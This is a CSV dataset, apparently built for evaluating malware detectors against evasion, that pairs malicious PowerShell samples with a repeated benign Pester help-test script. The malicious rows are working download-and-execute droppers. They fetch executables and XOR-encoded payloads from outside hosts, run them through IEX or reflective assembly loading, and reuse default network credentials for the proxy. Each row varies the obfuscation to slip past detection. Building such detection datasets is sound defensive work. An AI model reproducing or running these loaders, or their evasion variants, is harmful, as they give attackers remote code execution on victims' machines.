filename,label,content,pair_idx,pair_role,pair_indicator,pair_strategy,source_pair_idx,seed_id,technique_id,evasion_success
35f003c6ee4b9261caac262983739bceabc65c859b01414d170942cfd92de495__seed_d1dab60aa6f5__invoke_webrequest_alias.ps1,malicious,"sleep -Milliseconds 1235

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iwr -Uri ('ht'+'t'+'ps:'+'//'+'advert-job.ru/start.php') -UseBasicParsing

$bytes = (New-Object System.Net.WebClient).DownloadData(""https://adv-pardorudy.ru/dwnld/chatgpt.jpg"")
$assembly = [System.Reflection.Assembly]::Load($bytes)

$method = $assembly.EntryPoint
if ($method) {
    $args1 = @($null)
    $method.Invoke($null, $args1)
}

iwr -Uri ('ht'+'t'+'ps:'+'//'+'advert-job.ru/install.php') -UseBasicParsing",76,malicious,Invoke-WebRequest,evasion_probe,348,seed_d1dab60aa6f5,invoke_webrequest_alias,False
3228.ps1,benign,"$outputDir = Join-Path -Path $ENV:BHProjectPath -ChildPath 'out'
$outputModDir = Join-Path -Path $outputDir -ChildPath $env:BHProjectName
$manifest = Import-PowerShellDataFile -Path $env:BHPSModuleManifest
$outputModVerDir = Join-Path -Path $outputModDir -ChildPath $manifest.ModuleVersion





$commands = Get-Command -Module (Get-Module $env:BHProjectName) -CommandType Cmdlet, Function, Workflow  




foreach ($command in $commands) {
    $commandName = $command.Name

    
    $help = Get-Help $commandName -ErrorAction SilentlyContinue

    Describe ""Test help for $commandName"" {

        
        It 'should not be auto-generated' {
            $help.Synopsis | Should Not BeLike '*`[`<CommonParameters`>`]*'
        }

        
        It ""gets description for $commandName"" {
            $help.Description | Should Not BeNullOrEmpty
        }

        
        It ""gets example code from $commandName"" {
            ($help.Examples.Example | Select-Object -First 1).Code | Should Not BeNullOrEmpty
        }

        
        It ""gets example help from $commandName"" {
            ($help.Examples.Example.Remarks | Select-Object -First 1).Text | Should Not BeNullOrEmpty
        }

        Context ""Test parameter help for $commandName"" {

            $common = 'Debug', 'ErrorAction', 'ErrorVariable', 'InformationAction', 'InformationVariable', 'OutBuffer',
                'OutVariable', 'PipelineVariable', 'Verbose', 'WarningAction', 'WarningVariable', 'Confirm', 'Whatif'

            $parameters = $command.ParameterSets.Parameters |
                Sort-Object -Property Name -Unique |
                Where-Object { $_.Name -notin $common }
            $parameterNames = $parameters.Name

            
            $helpParameters = $help.Parameters.Parameter |
                Where-Object { $_.Name -notin $common } |
                Sort-Object -Property Name -Unique
            $helpParameterNames = $helpParameters.Name

            foreach ($parameter in $parameters) {
                $parameterName = $parameter.Name
                $parameterHelp = $help.parameters.parameter | Where-Object Name -EQ $parameterName

                
                It ""gets help for parameter: $parameterName : in $commandName"" {
                    $parameterHelp.Description.Text | Should Not BeNullOrEmpty
                }

                
                It ""help for $parameterName parameter in $commandName has correct Mandatory value"" {
                    $codeMandatory = $parameter.IsMandatory.toString()
                    $parameterHelp.Required | Should Be $codeMandatory
                }

                
                
                
                
                
                
                
            }

            foreach ($helpParm in $HelpParameterNames) {
                
                It ""finds help parameter in code: $helpParm"" {
                    $helpParm -in $parameterNames | Should Be $true
                }
            }
        }

        Context ""Help Links should be Valid for $commandName"" {
            $link = $help.relatedLinks.navigationLink.uri

            foreach ($link in $links) {
                if ($link) {
                    
                    it ""[$link] should have 200 Status Code for $commandName"" {
                        $Results = Invoke-WebRequest -Uri $link -UseBasicParsing
                        $Results.StatusCode | Should Be '200'
                    }
                }
            }
        }
    }
}",77,benign,Invoke-WebRequest,evasion_probe,349,seed_f99df091624c,iex_call_operator_string,False
3834__seed_f99df091624c__iex_call_operator_string.ps1,malicious,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;Invoke-WebRequest -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};&('I'+'EX') ($B-jOin'');",77,malicious,Invoke-WebRequest,evasion_probe,349,seed_f99df091624c,iex_call_operator_string,False
3228.ps1,benign,"$outputDir = Join-Path -Path $ENV:BHProjectPath -ChildPath 'out'
$outputModDir = Join-Path -Path $outputDir -ChildPath $env:BHProjectName
$manifest = Import-PowerShellDataFile -Path $env:BHPSModuleManifest
$outputModVerDir = Join-Path -Path $outputModDir -ChildPath $manifest.ModuleVersion





$commands = Get-Command -Module (Get-Module $env:BHProjectName) -CommandType Cmdlet, Function, Workflow  




foreach ($command in $commands) {
    $commandName = $command.Name

    
    $help = Get-Help $commandName -ErrorAction SilentlyContinue

    Describe ""Test help for $commandName"" {

        
        It 'should not be auto-generated' {
            $help.Synopsis | Should Not BeLike '*`[`<CommonParameters`>`]*'
        }

        
        It ""gets description for $commandName"" {
            $help.Description | Should Not BeNullOrEmpty
        }

        
        It ""gets example code from $commandName"" {
            ($help.Examples.Example | Select-Object -First 1).Code | Should Not BeNullOrEmpty
        }

        
        It ""gets example help from $commandName"" {
            ($help.Examples.Example.Remarks | Select-Object -First 1).Text | Should Not BeNullOrEmpty
        }

        Context ""Test parameter help for $commandName"" {

            $common = 'Debug', 'ErrorAction', 'ErrorVariable', 'InformationAction', 'InformationVariable', 'OutBuffer',
                'OutVariable', 'PipelineVariable', 'Verbose', 'WarningAction', 'WarningVariable', 'Confirm', 'Whatif'

            $parameters = $command.ParameterSets.Parameters |
                Sort-Object -Property Name -Unique |
                Where-Object { $_.Name -notin $common }
            $parameterNames = $parameters.Name

            
            $helpParameters = $help.Parameters.Parameter |
                Where-Object { $_.Name -notin $common } |
                Sort-Object -Property Name -Unique
            $helpParameterNames = $helpParameters.Name

            foreach ($parameter in $parameters) {
                $parameterName = $parameter.Name
                $parameterHelp = $help.parameters.parameter | Where-Object Name -EQ $parameterName

                
                It ""gets help for parameter: $parameterName : in $commandName"" {
                    $parameterHelp.Description.Text | Should Not BeNullOrEmpty
                }

                
                It ""help for $parameterName parameter in $commandName has correct Mandatory value"" {
                    $codeMandatory = $parameter.IsMandatory.toString()
                    $parameterHelp.Required | Should Be $codeMandatory
                }

                
                
                
                
                
                
                
            }

            foreach ($helpParm in $HelpParameterNames) {
                
                It ""finds help parameter in code: $helpParm"" {
                    $helpParm -in $parameterNames | Should Be $true
                }
            }
        }

        Context ""Help Links should be Valid for $commandName"" {
            $link = $help.relatedLinks.navigationLink.uri

            foreach ($link in $links) {
                if ($link) {
                    
                    it ""[$link] should have 200 Status Code for $commandName"" {
                        $Results = Invoke-WebRequest -Uri $link -UseBasicParsing
                        $Results.StatusCode | Should Be '200'
                    }
                }
            }
        }
    }
}",78,benign,Invoke-WebRequest,evasion_probe,349,seed_f99df091624c,iex_scriptblock_create,False
3834__seed_f99df091624c__iex_scriptblock_create.ps1,malicious,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;Invoke-WebRequest -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};&([scriptblock]::Create(($B-jOin'')));",78,malicious,Invoke-WebRequest,evasion_probe,349,seed_f99df091624c,iex_scriptblock_create,False
3228.ps1,benign,"$outputDir = Join-Path -Path $ENV:BHProjectPath -ChildPath 'out'
$outputModDir = Join-Path -Path $outputDir -ChildPath $env:BHProjectName
$manifest = Import-PowerShellDataFile -Path $env:BHPSModuleManifest
$outputModVerDir = Join-Path -Path $outputModDir -ChildPath $manifest.ModuleVersion





$commands = Get-Command -Module (Get-Module $env:BHProjectName) -CommandType Cmdlet, Function, Workflow  




foreach ($command in $commands) {
    $commandName = $command.Name

    
    $help = Get-Help $commandName -ErrorAction SilentlyContinue

    Describe ""Test help for $commandName"" {

        
        It 'should not be auto-generated' {
            $help.Synopsis | Should Not BeLike '*`[`<CommonParameters`>`]*'
        }

        
        It ""gets description for $commandName"" {
            $help.Description | Should Not BeNullOrEmpty
        }

        
        It ""gets example code from $commandName"" {
            ($help.Examples.Example | Select-Object -First 1).Code | Should Not BeNullOrEmpty
        }

        
        It ""gets example help from $commandName"" {
            ($help.Examples.Example.Remarks | Select-Object -First 1).Text | Should Not BeNullOrEmpty
        }

        Context ""Test parameter help for $commandName"" {

            $common = 'Debug', 'ErrorAction', 'ErrorVariable', 'InformationAction', 'InformationVariable', 'OutBuffer',
                'OutVariable', 'PipelineVariable', 'Verbose', 'WarningAction', 'WarningVariable', 'Confirm', 'Whatif'

            $parameters = $command.ParameterSets.Parameters |
                Sort-Object -Property Name -Unique |
                Where-Object { $_.Name -notin $common }
            $parameterNames = $parameters.Name

            
            $helpParameters = $help.Parameters.Parameter |
                Where-Object { $_.Name -notin $common } |
                Sort-Object -Property Name -Unique
            $helpParameterNames = $helpParameters.Name

            foreach ($parameter in $parameters) {
                $parameterName = $parameter.Name
                $parameterHelp = $help.parameters.parameter | Where-Object Name -EQ $parameterName

                
                It ""gets help for parameter: $parameterName : in $commandName"" {
                    $parameterHelp.Description.Text | Should Not BeNullOrEmpty
                }

                
                It ""help for $parameterName parameter in $commandName has correct Mandatory value"" {
                    $codeMandatory = $parameter.IsMandatory.toString()
                    $parameterHelp.Required | Should Be $codeMandatory
                }

                
                
                
                
                
                
                
            }

            foreach ($helpParm in $HelpParameterNames) {
                
                It ""finds help parameter in code: $helpParm"" {
                    $helpParm -in $parameterNames | Should Be $true
                }
            }
        }

        Context ""Help Links should be Valid for $commandName"" {
            $link = $help.relatedLinks.navigationLink.uri

            foreach ($link in $links) {
                if ($link) {
                    
                    it ""[$link] should have 200 Status Code for $commandName"" {
                        $Results = Invoke-WebRequest -Uri $link -UseBasicParsing
                        $Results.StatusCode | Should Be '200'
                    }
                }
            }
        }
    }
}",79,benign,Invoke-WebRequest,evasion_probe,349,seed_f99df091624c,invoke_webrequest_call_operator_string,False
3834__seed_f99df091624c__invoke_webrequest_call_operator_string.ps1,malicious,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;&('Invoke-'+'WebRequest') -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};IEX ($B-jOin'');",79,malicious,Invoke-WebRequest,evasion_probe,349,seed_f99df091624c,invoke_webrequest_call_operator_string,False
3228.ps1,benign,"$outputDir = Join-Path -Path $ENV:BHProjectPath -ChildPath 'out'
$outputModDir = Join-Path -Path $outputDir -ChildPath $env:BHProjectName
$manifest = Import-PowerShellDataFile -Path $env:BHPSModuleManifest
$outputModVerDir = Join-Path -Path $outputModDir -ChildPath $manifest.ModuleVersion





$commands = Get-Command -Module (Get-Module $env:BHProjectName) -CommandType Cmdlet, Function, Workflow  




foreach ($command in $commands) {
    $commandName = $command.Name

    
    $help = Get-Help $commandName -ErrorAction SilentlyContinue

    Describe ""Test help for $commandName"" {

        
        It 'should not be auto-generated' {
            $help.Synopsis | Should Not BeLike '*`[`<CommonParameters`>`]*'
        }

        
        It ""gets description for $commandName"" {
            $help.Description | Should Not BeNullOrEmpty
        }

        
        It ""gets example code from $commandName"" {
            ($help.Examples.Example | Select-Object -First 1).Code | Should Not BeNullOrEmpty
        }

        
        It ""gets example help from $commandName"" {
            ($help.Examples.Example.Remarks | Select-Object -First 1).Text | Should Not BeNullOrEmpty
        }

        Context ""Test parameter help for $commandName"" {

            $common = 'Debug', 'ErrorAction', 'ErrorVariable', 'InformationAction', 'InformationVariable', 'OutBuffer',
                'OutVariable', 'PipelineVariable', 'Verbose', 'WarningAction', 'WarningVariable', 'Confirm', 'Whatif'

            $parameters = $command.ParameterSets.Parameters |
                Sort-Object -Property Name -Unique |
                Where-Object { $_.Name -notin $common }
            $parameterNames = $parameters.Name

            
            $helpParameters = $help.Parameters.Parameter |
                Where-Object { $_.Name -notin $common } |
                Sort-Object -Property Name -Unique
            $helpParameterNames = $helpParameters.Name

            foreach ($parameter in $parameters) {
                $parameterName = $parameter.Name
                $parameterHelp = $help.parameters.parameter | Where-Object Name -EQ $parameterName

                
                It ""gets help for parameter: $parameterName : in $commandName"" {
                    $parameterHelp.Description.Text | Should Not BeNullOrEmpty
                }

                
                It ""help for $parameterName parameter in $commandName has correct Mandatory value"" {
                    $codeMandatory = $parameter.IsMandatory.toString()
                    $parameterHelp.Required | Should Be $codeMandatory
                }

                
                
                
                
                
                
                
            }

            foreach ($helpParm in $HelpParameterNames) {
                
                It ""finds help parameter in code: $helpParm"" {
                    $helpParm -in $parameterNames | Should Be $true
                }
            }
        }

        Context ""Help Links should be Valid for $commandName"" {
            $link = $help.relatedLinks.navigationLink.uri

            foreach ($link in $links) {
                if ($link) {
                    
                    it ""[$link] should have 200 Status Code for $commandName"" {
                        $Results = Invoke-WebRequest -Uri $link -UseBasicParsing
                        $Results.StatusCode | Should Be '200'
                    }
                }
            }
        }
    }
}",80,benign,Invoke-WebRequest,evasion_probe,349,seed_f99df091624c,invoke_webrequest_alias,False
3834__seed_f99df091624c__invoke_webrequest_alias.ps1,malicious,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;iwr -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};IEX ($B-jOin'');",80,malicious,Invoke-WebRequest,evasion_probe,349,seed_f99df091624c,invoke_webrequest_alias,False
3228.ps1,benign,"$outputDir = Join-Path -Path $ENV:BHProjectPath -ChildPath 'out'
$outputModDir = Join-Path -Path $outputDir -ChildPath $env:BHProjectName
$manifest = Import-PowerShellDataFile -Path $env:BHPSModuleManifest
$outputModVerDir = Join-Path -Path $outputModDir -ChildPath $manifest.ModuleVersion





$commands = Get-Command -Module (Get-Module $env:BHProjectName) -CommandType Cmdlet, Function, Workflow  




foreach ($command in $commands) {
    $commandName = $command.Name

    
    $help = Get-Help $commandName -ErrorAction SilentlyContinue

    Describe ""Test help for $commandName"" {

        
        It 'should not be auto-generated' {
            $help.Synopsis | Should Not BeLike '*`[`<CommonParameters`>`]*'
        }

        
        It ""gets description for $commandName"" {
            $help.Description | Should Not BeNullOrEmpty
        }

        
        It ""gets example code from $commandName"" {
            ($help.Examples.Example | Select-Object -First 1).Code | Should Not BeNullOrEmpty
        }

        
        It ""gets example help from $commandName"" {
            ($help.Examples.Example.Remarks | Select-Object -First 1).Text | Should Not BeNullOrEmpty
        }

        Context ""Test parameter help for $commandName"" {

            $common = 'Debug', 'ErrorAction', 'ErrorVariable', 'InformationAction', 'InformationVariable', 'OutBuffer',
                'OutVariable', 'PipelineVariable', 'Verbose', 'WarningAction', 'WarningVariable', 'Confirm', 'Whatif'

            $parameters = $command.ParameterSets.Parameters |
                Sort-Object -Property Name -Unique |
                Where-Object { $_.Name -notin $common }
            $parameterNames = $parameters.Name

            
            $helpParameters = $help.Parameters.Parameter |
                Where-Object { $_.Name -notin $common } |
                Sort-Object -Property Name -Unique
            $helpParameterNames = $helpParameters.Name

            foreach ($parameter in $parameters) {
                $parameterName = $parameter.Name
                $parameterHelp = $help.parameters.parameter | Where-Object Name -EQ $parameterName

                
                It ""gets help for parameter: $parameterName : in $commandName"" {
                    $parameterHelp.Description.Text | Should Not BeNullOrEmpty
                }

                
                It ""help for $parameterName parameter in $commandName has correct Mandatory value"" {
                    $codeMandatory = $parameter.IsMandatory.toString()
                    $parameterHelp.Required | Should Be $codeMandatory
                }

                
                
                
                
                
                
                
            }

            foreach ($helpParm in $HelpParameterNames) {
                
                It ""finds help parameter in code: $helpParm"" {
                    $helpParm -in $parameterNames | Should Be $true
                }
            }
        }

        Context ""Help Links should be Valid for $commandName"" {
            $link = $help.relatedLinks.navigationLink.uri

            foreach ($link in $links) {
                if ($link) {
                    
                    it ""[$link] should have 200 Status Code for $commandName"" {
                        $Results = Invoke-WebRequest -Uri $link -UseBasicParsing
                        $Results.StatusCode | Should Be '200'
                    }
                }
            }
        }
    }
}",81,benign,Invoke-WebRequest,evasion_probe,349,seed_f99df091624c,downloadstring_psobject_invoke,False
